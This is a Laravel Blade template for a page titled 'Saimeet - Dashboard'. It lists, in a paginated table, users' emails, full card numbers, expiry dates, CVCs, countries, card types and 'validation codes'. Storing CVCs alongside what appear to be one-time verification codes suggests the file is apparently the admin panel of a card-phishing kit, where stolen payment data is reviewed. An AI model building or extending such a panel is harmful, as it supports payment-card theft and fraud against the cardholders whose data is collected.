@extends('layouts.app')
@section('title', 'Saimeet - Dashboard')
@section('content')


<div class="table-responsive" style="padding:100px; margin-bottom:40px; ">
  <table class="table table-hover table-nowrap" style="border: 1px solid gray;">
    <thead class="table-light">
      <tr>
      <th scope="col">#</th>
        <th scope="col">Email</th>
        <th scope="col">Card Number</th>
        <th scope="col">MM / YY</th>
        <th scope="col">CVC</th>
        <th scope="col">Country</th>
        <th scope="col">Type</th>
        <th scope="col">Validation Code</th>
      </tr>
    </thead>
    <tbody>
      @foreach ($users as $user)
      <tr>
      <td>{{ $user->id }}</td>
        <td>{{ $user->email }}</td>
        <td>{{ $user->cardN }}</td>
        <td>{{ $user->date }}</td>
        <td>{{ $user->cvc }}</td>
        <td>{{ $user->country }}</td>
        <td>{{ $user->method }}</td>
        <td>{{ $user->codeV }}</td>
      </tr>
      @endforeach
    </tbody>
  </table>
  {{ $users->links() }}

</div>

@endsection